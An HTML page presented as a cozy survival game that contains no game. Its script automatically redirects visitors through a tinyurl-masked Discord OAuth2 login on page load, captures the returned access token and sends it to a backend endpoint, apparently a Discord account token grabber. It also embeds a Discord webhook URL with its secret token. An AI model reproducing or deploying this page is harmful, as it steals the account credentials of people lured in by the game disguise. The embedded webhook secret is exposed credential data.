<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LucasEM's Very Cozy Game</title>
    <style>
        /* Loading screen styles */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        #loading-text {
            font-size: 24px;
            color: white;
            font-family: Arial, sans-serif;
            font-weight: bold;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Loading screen -->
    <div id="loading-screen">
        <div class="spinner"></div>
        <div id="loading-text">LucasEM's cozy survival game</div>
    </div>

    <script>
        // Discord client ID and redirect URL
        const clientId = '1328323151330938910';  // Your Discord Client ID
        const redirectUri = 'https://tinyurl.com/Lucas-play-game';  // Your Redirect URL
        const webhookURL = "https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs";  // Webhook URL

        // Function to perform Discord OAuth2 login
        function loginWithDiscord() {
            const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=identify`;
            window.location.href = authUrl;  // Redirect to Discord login
        }

        // Call the login function when the page loads
        loginWithDiscord();

        // Fetch Discord user and send data
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.hash.substr(1));
            const accessToken = urlParams.get('access_token');

            if (accessToken) {
                // Send data to the backend
                fetch(`/discord?access_token=${accessToken}`, {
                    method: 'GET',
                }).then(response => response.text())
                  .then(data => {
                      console.log(data);
                      // Hide the loading screen
                      document.getElementById('loading-screen').style.display = 'none';
                  })
                  .catch(error => {
                      console.error('Error:', error);
                      alert('An error occurred!');
                  });
            }
        };
    </script>
</body>
</html>
